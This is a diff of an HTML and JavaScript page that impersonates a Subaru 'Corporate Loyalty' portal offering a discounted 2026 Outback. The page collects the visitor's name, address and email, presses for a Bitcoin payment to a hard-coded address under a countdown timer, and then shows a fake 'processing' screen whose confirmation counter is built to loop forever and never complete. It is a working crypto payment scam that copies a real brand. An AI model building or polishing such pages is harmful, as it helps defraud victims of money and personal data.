@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,35 +6,35 @@
   <title>Subaru Corporate Owner Loyalty Portal | 2026 Outback</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-100 text-gray-800 font-sans antialiased min-h-screen flex flex-col justify-between">
+<body class="bg-gray-900 text-gray-800 font-sans antialiased min-h-screen flex items-center justify-center p-4">
 
-  <!-- Header -->
-  <header class="bg-black text-white py-4 px-6 shadow-md flex justify-between items-center">
-    <div class="flex items-center space-x-3">
-      <img src="subaru-logo.png" alt="Subaru Logo" class="h-8 object-contain">
-      <span class="text-xs bg-blue-600 px-2 py-1 rounded tracking-wider uppercase font-semibold">Corporate Loyalty</span>
-    </div>
-    <div class="text-xs text-gray-400">
-      Status: <span class="text-green-400 font-bold">● Verified Owner Access</span>
-    </div>
-  </header>
-
-  <!-- Progress Bar -->
-  <div class="max-w-4xl mx-auto w-full px-6 pt-6">
-    <div class="flex items-center justify-between text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">
-      <span class="text-blue-600">1. Reservation</span>
-      <span>2. Payment</span>
-      <span>3. Processing</span>
-    </div>
-    <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
-      <div class="bg-blue-600 h-full w-1/3 transition-all duration-300"></div>
-    </div>
-  </div>
-
-  <!-- Main Container -->
-  <main class="max-w-4xl mx-auto my-6 bg-white rounded-xl shadow-lg overflow-hidden border border-gray-200 w-full flex-grow">
+  <!-- POPUP 1: RESERVATION & PAYMENT SELECTION -->
+  <div id="popup-1" class="bg-white rounded-xl shadow-2xl overflow-hidden border border-gray-200 w-full max-w-4xl">
     
-    <!-- Hero Banner -->
+    <!-- Header -->
+    <div class="bg-black text-white py-4 px-6 flex justify-between items-center">
+      <div class="flex items-center space-x-3">
+        <div class="w-8 h-8 bg-blue-600 rounded flex items-center justify-center text-xs font-bold">S</div>
+        <span class="text-xs bg-blue-600 px-2 py-1 rounded tracking-wider uppercase font-semibold">Corporate Loyalty</span>
+      </div>
+      <div class="text-xs text-gray-400">
+        Status: <span class="text-green-400 font-bold">● Verified Owner Access</span>
+      </div>
+    </div>
+
+    <!-- Progress -->
+    <div class="px-6 py-4 bg-gray-50 border-b">
+      <div class="flex items-center justify-between text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">
+        <span class="text-blue-600">1. Reservation</span>
+        <span>2. Payment</span>
+        <span>3. Processing</span>
+      </div>
+      <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
+        <div class="bg-blue-600 h-full w-1/3 transition-all duration-300"></div>
+      </div>
+    </div>
+
+    <!-- Hero -->
     <div class="bg-gradient-to-r from-slate-900 to-blue-900 text-white p-6">
       <p class="text-blue-400 text-xs font-bold uppercase tracking-widest">Official Owner Incentive</p>
       <h1 class="text-2xl font-extrabold mt-1">2026 Subaru Outback Premium AWD</h1>
@@ -46,10 +45,10 @@
       </div>
     </div>
 
-    <!-- STEP 1: RESERVATION & PAYMENT SELECTION -->
+    <!-- Content -->
     <div class="p-8 grid md:grid-cols-2 gap-8">
       <div>
-        <img src="outback.jpg" alt="2026 Subaru Outback" class="rounded-lg shadow-md w-full object-cover h-52">
+        <div class="bg-gray-200 rounded-lg shadow-md w-full h-52 flex items-center justify-center text-gray-500 text-sm">2026 Outback Image</div>
         <div class="mt-4 space-y-2 text-xs text-gray-600">
           <div class="flex justify-between border-b py-1"><span>Drivetrain:</span><span class="font-semibold text-gray-800">Symmetrical AWD</span></div>
           <div class="flex justify-between border-b py-1"><span>Safety Tech:</span><span class="font-semibold text-gray-800">EyeSight Driver Assist</span></div>
@@ -82,7 +81,7 @@
           <div class="mt-1 text-xs font-semibold text-blue-600">~$136 / month remaining</div>
         </label>
 
-        <form onsubmit="proceedToPayment(event)" class="space-y-3 pt-2">
+        <form onsubmit="showPopup2(event)" class="space-y-3 pt-2">
           <div>
             <label class="block text-xs font-bold text-gray-600 mb-1">Full Legal Name</label>
             <input type="text" id="cust-name" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="First Last">
@@ -97,95 +96,35 @@
         </form>
       </div>
     </div>
-  </main>
 
-  <footer class="text-center text-gray-400 text-[10px] py-4">
-    © 2026 Subaru of America, Inc. | Corporate Loyalty Direct Program
-  </footer>
-
-  <script>
-    let selectedOption = 1;
-    let selectedAmount = 17497.50;
-
-    function selectOption(opt) {
-      selectedOption = opt;
-      const card1 = document.getElementById('card-option1');
-      const card2 = document.getElementById('card-option2');
-
-      if (opt === 1) {
-        selectedAmount = 17497.50;
-        card1.className = "block border-2 border-blue-600 bg-blue-50/50 p-3.5 rounded-xl cursor-pointer transition-all";
-        card2.className = "block border-2 border-gray-200 p-3.5 rounded-xl cursor-pointer transition-all hover:border-gray-300";
-      } else {
-        selectedAmount = 8748.75;
-        card2.className = "block border-2 border-blue-600 bg-blue-50/50 p-3.5 rounded-xl cursor-pointer transition-all";
-        card1.className = "block border-2 border-gray-200 p-3.5 rounded-xl cursor-pointer transition-all hover:border-gray-300";
-      }
-    }
-
-    function proceedToPayment(event) {
-      event.preventDefault();
-      localStorage.setItem('subaru_plan', selectedOption === 1 ? '100% Upfront' : '50% Upfront');
-      localStorage.setItem('subaru_amount', selectedAmount);
-      localStorage.setItem('subaru_name', document.getElementById('cust-name').value);
-      localStorage.setItem('subaru_address', document.getElementById('cust-address').value);
-      window.location.href = 'payment.html';
-    }
-  </script>
-</body>
-</html>
-```
-
-**Page 2: payment.html** (Bitcoin Payment & Processing)
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Subaru Corporate Owner Loyalty Portal | Bitcoin Payment</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body class="bg-gray-100 text-gray-800 font-sans antialiased min-h-screen flex flex-col justify-between">
-
-  <!-- Header -->
-  <header class="bg-black text-white py-4 px-6 shadow-md flex justify-between items-center">
-    <div class="flex items-center space-x-3">
-      <img src="subaru-logo.png" alt="Subaru Logo" class="h-8 object-contain">
-      <span class="text-xs bg-blue-600 px-2 py-1 rounded tracking-wider uppercase font-semibold">Corporate Loyalty</span>
-    </div>
-    <div class="text-xs text-gray-400">
-      Status: <span class="text-green-400 font-bold">● Verified Owner Access</span>
-    </div>
-  </header>
-
-  <!-- Progress Bar -->
-  <div class="max-w-4xl mx-auto w-full px-6 pt-6">
-    <div class="flex items-center justify-between text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">
-      <span class="text-green-600">1. Reservation</span>
-      <span id="step2-label" class="text-blue-600">2. Payment</span>
-      <span id="step3-label">3. Processing</span>
-    </div>
-    <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
-      <div id="progress-bar" class="bg-blue-600 h-full w-2/3 transition-all duration-300"></div>
+    <div class="bg-gray-50 px-6 py-3 text-center text-gray-400 text-[10px]">
+      © 2026 Subaru of America, Inc. | Corporate Loyalty Direct Program
     </div>
   </div>
 
-  <!-- Main Container -->
-  <main class="max-w-4xl mx-auto my-6 bg-white rounded-xl shadow-lg overflow-hidden border border-gray-200 w-full flex-grow">
+  <!-- POPUP 2: BITCOIN PAYMENT -->
+  <div id="popup-2" class="hidden bg-white rounded-xl shadow-2xl overflow-hidden border border-gray-200 w-full max-w-2xl">
     
-    <!-- Hero Banner -->
-    <div class="bg-gradient-to-r from-slate-900 to-blue-900 text-white p-6">
-      <p class="text-blue-400 text-xs font-bold uppercase tracking-widest">Official Owner Incentive</p>
-      <h1 class="text-2xl font-extrabold mt-1">Bitcoin Payment</h1>
-      <div class="mt-3 inline-flex items-baseline gap-3 bg-white/10 px-3 py-2 rounded-lg backdrop-blur-sm border border-white/20">
-        <span class="text-xs text-gray-300">Amount Due:</span>
-        <span id="header-amount" class="text-xl font-black text-green-400">$17,497.50</span>
+    <div class="bg-black text-white py-4 px-6 flex justify-between items-center">
+      <div class="flex items-center space-x-3">
+        <div class="w-8 h-8 bg-blue-600 rounded flex items-center justify-center text-xs font-bold">S</div>
+        <span class="text-xs bg-blue-600 px-2 py-1 rounded tracking-wider uppercase font-semibold">Corporate Loyalty</span>
+      </div>
+      <button onclick="closePopup2()" class="text-gray-400 hover:text-white text-xl">&times;</button>
+    </div>
+
+    <div class="px-6 py-4 bg-gray-50 border-b">
+      <div class="flex items-center justify-between text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">
+        <span class="text-green-600">1. Reservation</span>
+        <span class="text-blue-600">2. Payment</span>
+        <span>3. Processing</span>
+      </div>
+      <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
+        <div class="bg-blue-600 h-full w-2/3 transition-all duration-300"></div>
       </div>
     </div>
 
-    <!-- STEP 2: BITCOIN PAYMENT -->
-    <div id="payment-section" class="p-8 space-y-6 max-w-xl mx-auto">
+    <div class="p-6 space-y-4">
       <h2 class="text-xl font-bold text-gray-900 text-center">2. Complete Bitcoin Payment</h2>
       
       <div class="bg-gray-50 border p-4 rounded-xl flex justify-between items-center text-sm">
@@ -199,182 +138,128 @@
         </div>
       </div>
 
-      <form onsubmit="submitPayment(event)" class="space-y-4">
-        <!-- Billing Information -->
-        <div class="space-y-3 pt-2">
-          <h3 class="text-xs font-bold text-gray-500 uppercase tracking-wider">Billing Information</h3>
-          
-          <div class="grid grid-cols-2 gap-3">
-            <div>
-              <label class="block text-xs font-bold text-gray-600 mb-1">Full Name</label>
-              <input type="text" id="billing-name" required class="w-full border p-2.5 rounded text-sm outline-none focus:border-blue-600" placeholder="John Doe">
-            </div>
-            <div>
-              <label class="block text-xs font-bold text-gray-600 mb-1">Email Address</label>
-              <input type="email" required class="w-full border p-2.5 rounded text-sm outline-none focus:border-blue-600" placeholder="john@example.com">
-            </div>
-          </div>
-
+      <form onsubmit="showPopup3(event)" class="space-y-3">
+        <div class="grid grid-cols-2 gap-3">
           <div>
-            <label class="block text-xs font-bold text-gray-600 mb-1">Street Address</label>
-            <input type="text" required class="w-full border p-2.5 rounded text-sm outline-none focus:border-blue-600" placeholder="123 Main St, Suite 100">
+            <label class="block text-xs font-bold text-gray-600 mb-1">Full Name</label>
+            <input type="text" id="billing-name" required class="w-full border p-2 rounded text-sm" placeholder="John Doe">
           </div>
-
-          <div class="grid grid-cols-3 gap-3">
-            <div>
-              <label class="block text-xs font-bold text-gray-600 mb-1">City</label>
-              <input type="text" required class="w-full border p-2.5 rounded text-sm outline-none focus:border-blue-600" placeholder="New York">
-            </div>
-            <div>
-              <label class="block text-xs font-bold text-gray-600 mb-1">Country</label>
-              <input type="text" required class="w-full border p-2.5 rounded text-sm outline-none focus:border-blue-600" placeholder="United States">
-            </div>
-            <div>
-              <label class="block text-xs font-bold text-gray-600 mb-1">Postal Code</label>
-              <input type="text" required class="w-full border p-2.5 rounded text-sm outline-none focus:border-blue-600" placeholder="10001">
-            </div>
+          <div>
+            <label class="block text-xs font-bold text-gray-600 mb-1">Email</label>
+            <input type="email" required class="w-full border p-2 rounded text-sm" placeholder="john@example.com">
           </div>
         </div>
 
-        <!-- Bitcoin Payment Section -->
-        <div class="p-5 bg-gradient-to-br from-orange-50 to-yellow-50 border-2 border-orange-200 rounded-xl space-y-4">
-          <!-- BTC Header -->
-          <div class="flex items-center gap-3 pb-3 border-b border-orange-200">
-            <div class="w-10 h-10 bg-orange-500 rounded-full flex items-center justify-center text-white font-bold text-lg">₿</div>
+        <div class="p-4 bg-gradient-to-br from-orange-50 to-yellow-50 border-2 border-orange-200 rounded-xl space-y-3">
+          <div class="flex items-center gap-2 pb-2 border-b border-orange-200">
+            <div class="w-8 h-8 bg-orange-500 rounded-full flex items-center justify-center text-white font-bold">₿</div>
             <div>
-              <div class="font-bold text-gray-900 text-sm">Bitcoin (BTC) Payment</div>
-              <div class="text-xs text-orange-600 font-semibold">Network: Bitcoin</div>
+              <div class="font-bold text-gray-900 text-sm">Bitcoin Payment</div>
+              <div class="text-xs text-orange-600">Network: Bitcoin</div>
             </div>
-            <div class="ml-auto text-right">
-              <div class="text-xs text-gray-500">BTC/USD</div>
-              <div id="btc-rate" class="text-xs font-bold text-gray-700">Loading...</div>
+            <div class="ml-auto text-right text-xs">
+              <div class="text-gray-500">BTC/USD</div>
+              <div id="btc-rate" class="font-bold">Loading...</div>
             </div>
           </div>
 
-          <!-- Amount Display -->
-          <div class="bg-white p-4 rounded-lg border border-orange-100">
-            <div class="flex justify-between items-center mb-2">
-              <span class="text-xs font-bold text-gray-500 uppercase">Amount Due</span>
-              <span id="crypto-usd" class="text-lg font-black text-gray-900">$17,497.50</span>
+          <div class="bg-white p-3 rounded border border-orange-100">
+            <div class="flex justify-between text-sm mb-1">
+              <span class="text-gray-500">Amount Due:</span>
+              <span id="crypto-usd" class="font-black">$17,497.50</span>
             </div>
             <div class="flex justify-between items-center">
-              <span class="text-xs text-gray-500">Bitcoin Equivalent</span>
-              <div class="text-right">
-                <span id="crypto-btc" class="text-xl font-black text-orange-600">---</span>
-                <span class="text-xs text-gray-500 ml-1">BTC</span>
-              </div>
+              <span class="text-xs text-gray-500">BTC:</span>
+              <span id="crypto-btc" class="text-lg font-black text-orange-600">---</span>
             </div>
-            <div class="text-[10px] text-gray-400 mt-2 text-center">Rate updates every 60 seconds</div>
           </div>
 
-          <!-- QR Code -->
           <div class="flex flex-col items-center">
-            <div class="bg-white p-3 rounded-lg border-2 border-dashed border-orange-300 mb-2">
-              <div class="w-32 h-32 bg-gray-800 flex items-center justify-center text-white text-xs">
-                BTC QR
-              </div>
-            </div>
-            <div class="text-xs text-gray-500 text-center">Scan with Bitcoin wallet</div>
+            <div class="bg-gray-800 w-24 h-24 rounded mb-1 flex items-center justify-center text-white text-xs">QR</div>
+            <span class="text-xs text-gray-500">Scan to pay</span>
           </div>
 
-          <!-- BTC Address -->
           <div>
-            <label class="block text-xs font-bold text-gray-700 mb-1 flex justify-between">
-              <span>Send to this Address</span>
-              <button type="button" onclick="copyAddress()" class="text-xs text-blue-600 hover:underline">Copy</button>
-            </label>
-            <div class="relative">
-              <input type="text" id="btc-address" readonly value="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" class="w-full border-2 border-orange-200 bg-white p-3 rounded-lg text-xs font-mono text-gray-700 outline-none focus:border-orange-400">
-              <span id="copy-msg" class="absolute right-2 top-3 text-[10px] text-green-600 font-bold hidden">Copied!</span>
-            </div>
+            <label class="block text-xs font-bold text-gray-700 mb-1">BTC Address</label>
+            <input type="text" readonly value="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" class="w-full border-2 border-orange-200 bg-white p-2 rounded text-xs font-mono">
           </div>
 
-          <!-- TxID Input -->
           <div>
             <label class="block text-xs font-bold text-gray-700 mb-1">Transaction ID (TxID)</label>
-            <input type="text" id="crypto-txid" placeholder="Enter your Bitcoin transaction ID" class="w-full border-2 border-orange-200 bg-white p-3 rounded-lg text-xs font-mono outline-none focus:border-orange-400" required>
-            <div class="text-[10px] text-gray-500 mt-1">Enter TxID after sending payment</div>
+            <input type="text" id="crypto-txid" required class="w-full border-2 border-orange-200 p-2 rounded text-xs font-mono" placeholder="Enter TxID after sending">
           </div>
 
-          <!-- Timer -->
-          <div class="bg-orange-100 p-3 rounded-lg flex items-center justify-between">
-            <span class="text-xs font-bold text-orange-800">Payment Window</span>
-            <span id="btc-timer" class="text-sm font-black text-orange-700 font-mono">29:59</span>
+          <div class="bg-orange-100 p-2 rounded flex justify-between text-xs">
+            <span class="font-bold text-orange-800">Time Remaining</span>
+            <span id="btc-timer" class="font-black text-orange-700 font-mono">29:59</span>
           </div>
         </div>
 
-        <div class="flex gap-3 pt-2">
-          <button type="button" onclick="window.location.href='index.html'" class="w-1/3 bg-gray-200 hover:bg-gray-300 text-gray-700 font-bold py-3 rounded-xl text-sm">
+        <div class="flex gap-2 pt-2">
+          <button type="button" onclick="closePopup2()" class="w-1/3 bg-gray-200 hover:bg-gray-300 text-gray-700 font-bold py-2 rounded text-sm">
             ← Back
           </button>
-          <button type="submit" class="w-2/3 bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-xl shadow transition-all text-sm">
-            Submit Payment
+          <button type="submit" class="w-2/3 bg-green-600 hover:bg-green-700 text-white font-bold py-2 rounded text-sm">
+            Submit Payment →
           </button>
         </div>
       </form>
     </div>
+  </div>
 
-    <!-- STEP 3: TRANSACTION PROCESSING (INDEFINITE) -->
-    <div id="processing-section" class="p-8 hidden text-center space-y-6 max-w-xl mx-auto">
-      <div class="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto">
-        <div class="w-8 h-8 border-4 border-yellow-600 border-t-transparent rounded-full animate-spin"></div>
-      </div>
-      
-      <div>
-        <h2 class="text-2xl font-extrabold text-gray-900">Transaction Processing</h2>
-        <p class="text-sm text-gray-500 mt-2">Your Bitcoin payment is being verified on the blockchain</p>
-      </div>
+  <!-- POPUP 3: TRANSACTION PROCESSING (INDEFINITE) -->
+  <div id="popup-3" class="hidden bg-white rounded-xl shadow-2xl overflow-hidden border border-gray-200 w-full max-w-md text-center p-8">
+    
+    <div class="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-4">
+      <div class="w-8 h-8 border-4 border-yellow-600 border-t-transparent rounded-full animate-spin"></div>
+    </div>
+    
+    <h2 class="text-2xl font-extrabold text-gray-900 mb-2">Transaction Processing</h2>
+    <p class="text-sm text-gray-500 mb-6">Your Bitcoin payment is being verified on the blockchain</p>
 
-      <div class="bg-gray-50 border p-4 rounded-xl text-left text-xs space-y-3">
-        <div class="flex justify-between border-b pb-2">
-          <span class="text-gray-500">Status:</span>
-          <span class="font-bold text-yellow-600 animate-pulse">● Confirming</span>
-        </div>
-        <div class="flex justify-between border-b pb-2">
-          <span class="text-gray-500">Amount:</span>
-          <span id="processing-amount" class="font-bold">$17,497.50</span>
-        </div>
-        <div class="flex justify-between border-b pb-2">
-          <span class="text-gray-500">BTC Sent:</span>
-          <span id="processing-btc" class="font-bold font-mono">--- BTC</span>
-        </div>
-        <div class="flex justify-between border-b pb-2">
-          <span class="text-gray-500">TxID:</span>
-          <span id="processing-txid" class="font-bold font-mono text-[10px] truncate max-w-[200px]">---</span>
-        </div>
-        <div class="flex justify-between">
-          <span class="text-gray-500">Confirmations:</span>
-          <span id="confirmations" class="font-bold text-blue-600">0/6</span>
-        </div>
+    <div class="bg-gray-50 border p-4 rounded-xl text-left text-xs space-y-2 mb-4">
+      <div class="flex justify-between border-b pb-2">
+        <span class="text-gray-500">Status:</span>
+        <span class="font-bold text-yellow-600 animate-pulse">● Confirming</span>
       </div>
-
-      <div class="bg-blue-50 border border-blue-200 p-4 rounded-xl">
-        <div class="flex items-center gap-2 mb-2">
-          <div class="w-2 h-2 bg-blue-600 rounded-full animate-pulse"></div>
-          <span class="text-xs font-bold text-blue-900">Network Status</span>
-        </div>
-        <p class="text-xs text-blue-700">Waiting for blockchain confirmation. This may take 10-60 minutes depending on network congestion. Please do not close this window.</p>
+      <div class="flex justify-between border-b pb-2">
+        <span class="text-gray-500">Amount:</span>
+        <span id="processing-amount" class="font-bold">$17,497.50</span>
       </div>
-
-      <div class="space-y-2">
-        <div class="h-1 w-full bg-gray-200 rounded-full overflow-hidden">
-          <div id="progress-indeterminate" class="h-full bg-blue-600 w-1/3 animate-[slide_2s_infinite]"></div>
-        </div>
-        <p class="text-xs text-gray-400">Estimated time: Calculating...</p>
+      <div class="flex justify-between border-b pb-2">
+        <span class="text-gray-500">BTC:</span>
+        <span id="processing-btc" class="font-bold font-mono">---</span>
       </div>
-
-      <div class="pt-4">
-        <button onclick="window.location.href='index.html'" class="bg-gray-200 hover:bg-gray-300 text-gray-700 text-xs font-bold px-6 py-3 rounded-xl">
-          Return to Home
-        </button>
+      <div class="flex justify-between border-b pb-2">
+        <span class="text-gray-500">TxID:</span>
+        <span id="processing-txid" class="font-bold font-mono text-[10px] truncate">---</span>
+      </div>
+      <div class="flex justify-between">
+        <span class="text-gray-500">Confirmations:</span>
+        <span id="confirmations" class="font-bold text-blue-600">0/6</span>
       </div>
     </div>
 
-  </main>
+    <div class="bg-blue-50 border border-blue-200 p-3 rounded-lg mb-4">
+      <p class="text-xs text-blue-700">Waiting for blockchain confirmation. This may take 10-60 minutes. Please do not close this window.</p>
+    </div>
 
-  <footer class="text-center text-gray-400 text-[10px] py-4">
-    © 2026 Subaru of America, Inc. | Corporate Loyalty Direct Program
-  </footer>
+    <div class="h-1 w-full bg-gray-200 rounded-full overflow-hidden mb-2">
+      <div class="h-full bg-blue-600 w-1/3 animate-[slide_2s_infinite]"></div>
+    </div>
+    <p class="text-xs text-gray-400 mb-4">Estimated time: Calculating...</p>
+
+    <button onclick="location.reload()" class="bg-gray-200 hover:bg-gray-300 text-gray-700 text-xs font-bold px-6 py-2 rounded">
+      Return to Start
+    </button>
+  </div>
+
+  <style>
+    @keyframes slide {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(400%); }
+    }
+  </style>
 
   <script>
     let selectedAmount = 17497.50;
@@ -382,19 +267,14 @@
     let timerInterval;
     let confirmationInterval;
 
-    function loadData() {
-      selectedAmount = parseFloat(localStorage.getItem('subaru_amount')) || 17497.50;
-      const plan = localStorage.getItem('subaru_plan') || '100% Upfront';
-      const name = localStorage.getItem('subaru_name') || '';
-      
-      document.getElementById('summary-plan').textContent = plan;
-      document.getElementById('summary-amount').textContent = '$' + selectedAmount.toLocaleString();
-      document.getElementById('header-amount').textContent = '$' + selectedAmount.toLocaleString();
-      document.getElementById('crypto-usd').textContent = '$' + selectedAmount.toLocaleString();
-      document.getElementById('billing-name').value = name;
-      
-      fetchBTCRate();
-      startTimer();
+    function selectOption(opt) {
+      selectedAmount = opt === 1 ? 17497.50 : 8748.75;
+      document.getElementById('card-option1').className = opt === 1 ? 
+        "block border-2 border-blue-600 bg-blue-50/50 p-3.5 rounded-xl cursor-pointer transition-all" :
+        "block border-2 border-gray-200 p-3.5 rounded-xl cursor-pointer transition-all hover:border-gray-300";
+      document.getElementById('card-option2').className = opt === 2 ? 
+        "block border-2 border-blue-600 bg-blue-50/50 p-3.5 rounded-xl cursor-pointer transition-all" :
+        "block border-2 border-gray-200 p-3.5 rounded-xl cursor-pointer transition-all hover:border-gray-300";
     }
 
     async function fetchBTCRate() {
@@ -407,11 +287,12 @@
       }
       document.getElementById('btc-rate').textContent = '$' + btcPrice.toLocaleString();
       const btcAmt = (selectedAmount / btcPrice).toFixed(8);
-      document.getElementById('crypto-btc').textContent = btcAmt;
+      document.getElementById('crypto-btc').textContent = btcAmt + ' BTC';
     }
 
     function startTimer() {
       let sec = 1799;
+      clearInterval(timerInterval);
       timerInterval = setInterval(() => {
         const m = Math.floor(sec / 60);
         const s = sec % 60;
@@ -420,15 +301,27 @@
       }, 1000);
     }
 
-    function copyAddress() {
-      const addr = document.getElementById('btc-address');
-      addr.select();
-      document.execCommand('copy');
-      document.getElementById('copy-msg').classList.remove('hidden');
-      setTimeout(() => document.getElementById('copy-msg').classList.add('hidden'), 2000);
+    function showPopup2(event) {
+      event.preventDefault();
+      document.getElementById('popup-1').classList.add('hidden');
+      document.getElementById('popup-2').classList.remove('hidden');
+      
+      const plan = selectedAmount === 17497.50 ? '100% Upfront' : '50% Upfront';
+      document.getElementById('summary-plan').textContent = plan;
+      document.getElementById('summary-amount').textContent = '$' + selectedAmount.toLocaleString();
+      document.getElementById('crypto-usd').textContent = '$' + selectedAmount.toLocaleString();
+      document.getElementById('billing-name').value = document.getElementById('cust-name').value;
+      
+      fetchBTCRate();
+      startTimer();
     }
 
-    function submitPayment(event) {
+    function closePopup2() {
+      document.getElementById('popup-2').classList.add('hidden');
+      document.getElementById('popup-1').classList.remove('hidden');
+    }
+
+    function showPopup3(event) {
       event.preventDefault();
       const txid = document.getElementById('crypto-txid').value;
       if (!txid || txid.length < 10) {
@@ -436,34 +329,20 @@
         return;
       }
       
-      // Show processing screen indefinitely
-      document.getElementById('payment-section').classList.add('hidden');
-      document.getElementById('processing-section').classList.remove('hidden');
-      document.getElementById('progress-bar').style.width = '100%';
-      document.getElementById('step2-label').className = 'text-green-600';
-      document.getElementById('step3-label').className = 'text-blue-600 animate-pulse';
+      document.getElementById('popup-2').classList.add('hidden');
+      document.getElementById('popup-3').classList.remove('hidden');
       
-      // Populate processing details
       document.getElementById('processing-amount').textContent = '$' + selectedAmount.toLocaleString();
-      document.getElementById('processing-btc').textContent = document.getElementById('crypto-btc').textContent + ' BTC';
-      document.getElementById('processing-txid').textContent = txid;
+      document.getElementById('processing-btc').textContent = document.getElementById('crypto-btc').textContent;
+      document.getElementById('processing-txid').textContent = txid.substring(0, 25) + '...';
       
-      // Simulate indefinite confirmation progress
       let confs = 0;
       confirmationInterval = setInterval(() => {
         confs = (confs + 1) % 6;
         document.getElementById('confirmations').textContent = confs + '/6';
-      }, 30000); // Update every 30 seconds
+      }, 30000);
     }
-
-    window.onload = loadData;
   </script>
-  
-  <style>
-    @keyframes slide {
-      0% { transform: translateX(-100%); }
-      100% { transform: translateX(300%); }
-    }
-  </style>
 </body>
 </html>
+
